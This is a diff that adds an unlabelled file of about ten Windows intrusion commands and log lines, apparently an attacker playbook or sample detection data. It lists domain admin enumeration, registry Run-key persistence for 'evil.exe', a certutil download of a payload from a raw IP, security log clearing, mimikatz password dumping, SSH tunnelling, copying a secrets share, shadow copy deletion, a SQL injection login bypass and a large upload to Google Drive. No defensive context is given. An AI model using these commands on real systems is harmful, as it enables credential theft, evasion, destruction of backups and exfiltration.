@@ -1,0 +1,19 @@
+net localgroup adminstartors /domain
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\Temp\evil.exe"
+
+certutil -urlcache -split -f http://1.2.3.4/payload.exe payload.exe
+
+wevtutil cl Security
+
+mimikatz # sekurlsa::logonpasswords
+
+ssh -L 8080:internal.server:80 user@jumphost
+
+xcopy /S /E \\filesvr\secrets C:\Users\Public\tmp\
+
+wmic shadowcopy delete /nointeractive
+
+GET /login.php?user=admin'OR'1'='1 HTTP/1.1 -> 200 OK
+
+PROXY LOG: PUT https://drive.google.com/upload/... 3.8GB
